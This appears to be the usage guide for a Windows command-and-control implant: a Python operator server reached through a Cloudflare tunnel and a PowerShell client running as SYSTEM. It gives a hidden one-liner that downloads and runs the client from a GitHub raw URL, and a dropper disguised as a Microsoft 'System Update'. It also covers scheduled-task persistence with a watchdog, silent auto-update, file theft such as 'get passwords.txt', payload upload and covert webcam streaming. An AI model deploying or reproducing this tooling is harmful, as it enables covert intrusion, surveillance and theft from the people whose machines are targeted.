# Shell C2 — Usage Guide (v2.8.0)

## Architecture

```
[Mac/Linux]                                [Windows Target]
server.py  ←── Cloudflare Tunnel ──→  pdf2.ps1 (SYSTEM)
  port 4444                              polls /cmd, streams output
```

- `server.py` — operator terminal on Mac/Linux
- `pdf2.ps1` — Windows client, runs as SYSTEM, auto-persists, auto-updates

---

## Startup (Order Matters)

```bash
# 1. Start the server
python3 server.py

# 2. Start the Cloudflare tunnel (separate terminal)
cloudflared tunnel run <your-tunnel-name>

# 3. Deploy client on Windows (see Deployment below)
```

> **Why order matters:** If tunnel starts before `server.py`, cloudflared can't reach port 4444 and logs `connection refused`. The client retries automatically with exponential backoff.

---

## Deployment

### Option A — One-liner (PowerShell)

```powershell
Start-Process powershell -Verb RunAs -ArgumentList '-ep bypass -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest ''https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1'' -OutFile ''C:\pdf2.ps1'' -UseBasicParsing;& ''C:\pdf2.ps1''"'
```

Triggers UAC → downloads to `C:\pdf2.ps1` → installs persistence → connects.

### Option B — EXE Dropper (one-click)

Build from `loader.ps1` using PS2EXE:

```powershell
# Install PS2EXE (one time)
Install-Module ps2exe -Force -Scope CurrentUser

# Build the .exe
Invoke-PS2EXE -InputFile .\loader.ps1 -OutputFile .\SystemUpdate.exe `
  -requireAdmin -noConsole -noOutput `
  -iconFile .\icon.ico `
  -title "System Update" -description "System Management" `
  -company "Microsoft" -version "1.0.0"
```

**Adding an icon:**

```powershell
# Extract Windows Update icon
Add-Type -AssemblyName System.Drawing
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\wuauclt.exe")
$fs = [System.IO.FileStream]::new(".\icon.ico", [System.IO.FileMode]::Create)
$icon.Save($fs); $fs.Close()
```

Double-click `SystemUpdate.exe` → UAC prompt → downloads & runs pdf2.ps1 → done.

---

## Operator Commands

### Session Management

| Command | Description | Example |
|---|---|---|
| `sessions` | List all connected clients | `sessions` |
| `use <id>` | Switch active target (number or name) | `use 1` or `use DESKTOP` |
| `status` | Check if active client is online | `status` |
| `kill <id>` | Send exit to client (full cleanup) | `kill 1` or `kill DESKTOP` |
| `remove <id>` | Remove stale client from list | `remove 2` |

```
shell> sessions
[*] 2 client(s):
  [1] DESKTOP-ABC    ONLINE (IDLE) — 1.2s ago
  [2] LAPTOP-XYZ     ONLINE (RUNNING) — 0.8s ago ←

shell> use 1
[*] Active target: DESKTOP-ABC

DESKTOP-ABC> whoami
nt authority\system
```

> **⚠ Important:** `exit` shuts down the **server**. Use `kill <id>` to stop a **client**.

### Command Control

| Command | Description |
|---|---|
| `cancel` | Abort running command on active client |
| `Ctrl+\` | Same as cancel (keyboard shortcut) |

> `Ctrl+C` exits `server.py` entirely. Use `Ctrl+\` or `cancel` to stop just the remote command.

### Client Commands (sent to remote machine)

| Command | Description | Example |
|---|---|---|
| `get <filepath>` | Copy file from Windows VM to ~/Desktop on Mac — abs or relative to remote cwd | `get secret.txt` or `get C:\Users\user\file.txt` |
| `put <filepath>` | Push local file from Mac to `C:\SystemUpdate\` on Windows (created if missing) — abs or relative to Mac cwd | `put tool.exe` or `put ~/Desktop/tool.exe` |
| `version` | Show client version, host, PID | `version` |
| `update` | Force immediate self-update from GitHub | `update` |
| `stream` | Start webcam stream — works in **both** user and SYSTEM mode. Open the printed URL in your browser. | `stream` |
| `stopstream` | Stop webcam stream | `stopstream` |
| `gui:<cmd>` | Launch GUI app on user's desktop | `gui:explorer .` |
| `notimeout:<cmd>` | Run without 300s timeout | `notimeout:ping -t 8.8.8.8` |

### Shortcuts (auto-route to GUI)

Just type the name — no `gui:` prefix needed:

| Command | Opens |
|---|---|
| `camera` | Windows Camera app |
| `recorder` | Sound Recorder |
| `settings` | Windows Settings |
| `calc` | Calculator |

### Server Commands

| Command | Description |
|---|---|
| `exit` | Shut down THIS server (not the client!) |
| `help` | Show command reference |

---

## Webcam Streaming

Works in **both** normal user and SYSTEM context — no need to run in user mode first.

```
DESKTOP-ABC> stream
[*] Camera stream started on DESKTOP-ABC
[*] View at: http://localhost:4444/camera?id=DESKTOP-ABC
```

Open the URL in your browser for the live MJPEG feed. Type `stopstream` to end it.

- **Normal user**: captures directly via WinRT `MediaCapture`
- **SYSTEM**: spawns a scheduled task as the logged-on user (who has camera access) and streams frames back

---

## File Transfer

```
# Pull file from Windows → ~/Desktop on Mac (relative or absolute)
DESKTOP-ABC> get passwords.txt
DESKTOP-ABC> get C:\Users\user\Documents\report.pdf

# Push file from Mac → C:\SystemUpdate\ on Windows (created if missing)
shell> put tool.exe
shell> put ~/Desktop/payload.exe
```

---

## GUI Launch (`gui:` prefix)

Since the client runs as SYSTEM (Session 0, no desktop), normal GUI apps are invisible. The `gui:` prefix launches apps visibly on the logged-in user's desktop.

```
DESKTOP-ABC> gui:explorer .        → Opens Explorer in current dir
DESKTOP-ABC> gui:notepad           → Opens Notepad
DESKTOP-ABC> gui:code .            → Opens VS Code (auto-resolves path)
DESKTOP-ABC> gui:calc              → Opens Calculator
```

**How it works:** Creates a temporary scheduled task as the logged-in user with `Interactive` logon → runs on their visible desktop → task auto-deleted after 3 seconds.

**Error handling:**
- **File not found (0x80070002)** — exe doesn't exist
- **Access denied (0x80070005)** — permission issue
- Non-zero exit codes from GUI apps (like Explorer's `1`) are treated as success

**Exe resolution:** SYSTEM doesn't have the user's PATH. The script searches common install locations for VS Code, Sublime Text, and Cursor automatically.

---

## Version & Update

### Check running version

```
DESKTOP-ABC> version
[*] Client Version: v2.8.0
    Host: DESKTOP-ABC
    User: SYSTEM
    PID: 4312
    Path: C:\pdf2.ps1
```

### Manual update

```
DESKTOP-ABC> update
[*] Checking for updates from GitHub...
[+] Updated to new version! Restarting via watchdog in ~1 min...
```

### Auto-update

Checks GitHub every 30 minutes. If the SHA256 hash differs:

```
Download latest → Hash compare → Overwrite C:\pdf2.ps1
→ Release mutex → Exit → Watchdog relaunches ≤1 min
```

No UAC popup. No manual intervention. Push to GitHub → all targets update within 30 min.

### First-time manual update (old version without `update` command)

Run through C2:

```
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest 'https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1' -OutFile 'C:\pdf2.ps1' -UseBasicParsing; Write-Output 'Done'
```

Then `kill <id>` to restart the client. Watchdog relaunches with new version.

---

## Interactive Mode

Typing a bare interactive binary drops you into stdin-forwarding mode:

```
DESKTOP-ABC> cmd
PS C:\Windows\system32> cmd [300s] [interactive]
C:\Windows\System32>whoami
nt authority\system

DESKTOP-ABC [interactive]> cancel
[!] Command cancelled by operator.
```

**Auto-detected:** `cmd`, `powershell`, `pwsh`, `python`, `python3`, `node`, `nslookup`, `ftp`, `telnet`, `wsl`, `bash`, `diskpart`

> Only bare commands trigger interactive mode. With args (e.g. `python script.py`) they run normally.

---

## Long-Running Commands

Default timeout: **300 seconds**. Use `notimeout:` prefix for longer:

```
DESKTOP-ABC> notimeout:ping -t 8.8.8.8
PS C:\> ping -t 8.8.8.8 [no-timeout]
...
```

Use `Ctrl+\` or `cancel` to stop when done.

---

## Persistence

| Mechanism | Purpose |
|---|---|
| `SystemManagementUpdate` task | Runs at startup + logon as SYSTEM |
| `SystemManagementUpdateWatchdog` task | Every 1 min, relaunches if killed |
| Anti-sleep power policy | Lid close = do nothing, standby disabled |
| WakeToRun | Wakes from sleep for watchdog |
| Self-kill + restart | After 5 min continuous failure, fresh restart |

---

## Log File (`shell.txt`)

Located at `C:\shell.txt` (same dir as script). Auto-rotates at 5 MB.

| Entry | Meaning |
|---|---|
| `Client v2.8.0 started. PID=...` | Client launched |
| `CMD: <command>` | Command received |
| `Connection error #N` | Cloudflare tunnel issue — auto retries |
| `Update found! Hash xxx.. -> yyy..` | Auto-update applying |
| `Manual update triggered` | Operator ran `update` |
| `GUI launched: code . as USER` | GUI app launched successfully |

---

## Client Status

```
shell> status
```

| Output | Meaning |
|---|---|
| `ONLINE (IDLE) — 1.2s ago` | Connected, waiting |
| `ONLINE (RUNNING) — 0.4s ago` | Executing a command |
| `may be OFFLINE — 45s ago` | No recent check-in |

Server auto-warns if no check-in for 20+ seconds.

---

## Cleanup (Full Uninstall)

### From the server (cleanest)

```
shell> kill 1
```

This sends `exit` to the client which:
- ✅ Removes both scheduled tasks
- ✅ Deletes `C:\pdf2.ps1` and `C:\shell.txt`
- ✅ Restores lid-close and standby power policy
- ✅ Cleans up any GUI tasks
- ✅ Releases mutex and exits

### Manual cleanup on Windows (run as Admin)

```powershell
Unregister-ScheduledTask -TaskName "SystemManagementUpdate" -Confirm:$false
Unregister-ScheduledTask -TaskName "SystemManagementUpdateWatchdog" -Confirm:$false
Remove-Item C:\pdf2.ps1, C:\shell.txt -Force -ErrorAction SilentlyContinue
powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1
powercfg /change standby-timeout-ac 30
powercfg /setactive SCHEME_CURRENT
```

### Mac — stop server

```bash
pkill -f server.py
pkill cloudflared
```

---

## Troubleshooting

| Problem | Fix |
|---|---|
| `connection refused` in cloudflared | Start `server.py` before the tunnel |
| `530` errors in shell.txt | Tunnel not ready yet — auto retries |
| `update` says "already latest" | GitHub CDN caching — wait 2-3 min and retry |
| `version` / `update` not recognized | Client running old version — see "First-time manual update" |
| GUI app not found | Use full path: `gui:C:\path\to\app.exe` |
| `exit` killed the server | `exit` = server shutdown. Use `kill <id>` for clients |

---

## Quick Reference

| Action | Command |
|---|---|
| Copy file from VM | `get secret.txt` or `get C:\path\to\file.txt` |
| Push file to VM | `put tool.exe` or `put ~/Desktop/tool.exe` |
| Start webcam stream | `stream` (works as user or SYSTEM) |
| Stop webcam stream | `stopstream` |
| List clients | `sessions` |
| Select target | `use <id>` or `use <name>` |
| Check version | `version` |
| Force update | `update` |
| Launch GUI app | `gui:<cmd>` |
| No-timeout run | `notimeout:<cmd>` |
| Cancel command | `Ctrl+\` or `cancel` |
| Interactive shell | `cmd`, `python` (bare) |
| Kill a client | `kill <id>` |
| Remove stale | `remove <id>` |
| Check connectivity | `status` |
| Shut down server | `exit` |
| View help | `help` |
